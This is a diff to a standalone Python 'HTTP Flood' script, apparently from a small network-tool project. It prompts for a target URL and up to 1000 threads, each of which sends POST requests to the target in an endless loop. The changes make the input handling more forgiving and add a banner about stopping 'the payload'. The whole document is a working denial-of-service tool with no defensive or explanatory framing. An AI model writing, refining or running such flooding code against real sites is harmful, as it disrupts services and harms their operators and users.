@@ -1,6 +1,7 @@
 # Simple HTTP Flood python script
 # Standalone PacketPy script
 # https://github.com/fortless
+# Base written by https://github.com/awaitclone
 
 version = '1.1-01_beta' # Don't touch this
 
@@ -26,28 +27,19 @@ print("")
 def dos(target):
     while True:
             res = requests.post(url, data={'requesting': '666666',})        
-
 threads = 20
-
 url = input("Target URL [https://example.com]: ")
-
+if not url.__contains__("http") or not url.__contains__(".") or not url.__contains__("://"):
+    while not url.__contains__("http") or not url.__contains__("."):
+        print("Please provide a valid URL.")
+        url = input("Target URL [https://example.com]: ")
 try:
     threads = int(input("Threads [20] [1-1000]:  "))
 except ValueError:
-    exit("Error")
-
+    threads = 20
 if threads == 0:
-    exit("Minimum [1]")
-
-if not url.__contains__("http"):
-    exit("Provide full URL")
-
-if not url.__contains__("."):
-    exit("Error")
-
-if not url.__contains__("."):
-    exit("Error")
-
+    print("Threads must be at least 1. Setting to 1.")
+    threads = 1
 clearterminal()
 print("-----------------------------------------")
 print("")
@@ -64,6 +56,8 @@ print("network tool library, written in")
 print("Python.")
 print("")
 print("Interactive mode (HTTP Flood)")
+print("")
+print("---> Press CTRL+C to stop the payload!")
 print("-----------------------------------------")
 
 for i in range(0, threads):
